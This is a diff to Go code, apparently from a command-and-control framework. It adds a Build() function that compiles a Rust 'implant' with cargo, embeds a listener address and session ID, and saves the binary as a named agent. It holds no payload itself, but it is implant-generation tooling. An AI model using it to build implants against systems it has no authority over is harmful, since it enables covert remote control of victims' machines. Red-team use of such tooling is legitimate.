@@ -1,5 +1,11 @@
 package agents
 
+import (
+	"fmt"
+	"os"
+	"os/exec"
+)
+
 type NewAgentRequest struct {
 	Name     string `json:"name"`
 	Listener string `json:"listener"`
@@ -40,10 +46,35 @@ type Agent struct {
 	ProcessName string `json:"process"`
 	Sleep       int    `json:"sleep"`
 	Jitter      int    `json:"jitter"`
+	// TODO: cycling uris
+	// Uris      []string `json:"uris"`
 }
 
-// Generates the implant to be deployed on the target system given the agent config
-func (a *Agent) Build() error {
-	// Placeholder for build logic
-	return nil
+func (a *Agent) Build() (*string, error) {
+
+	// TODO: make this dynamic
+	target := "x86_64-unknown-linux-gnu"
+
+	cmd := exec.Command("cargo", "build", "--features", "http", "--release", "--target", target)
+
+	cmd.Env = append(os.Environ(),
+		"LISTENER_ADDRESS="+a.Listener,
+		"SESSION_ID="+a.Id,
+	)
+	cmd.Dir = "./implant"
+
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return nil, fmt.Errorf("compilation failed: %s", string(output))
+	}
+
+	binaryPath := "./implant/target/" + target + "/release/implant" + a.Format
+
+	err := os.Rename(binaryPath, "./agents/"+a.Name+a.Format)
+	if err != nil {
+		return nil, err
+	}
+
+	agentPath := "./agents/" + a.Name + a.Format
+
+	return &agentPath, nil
 }
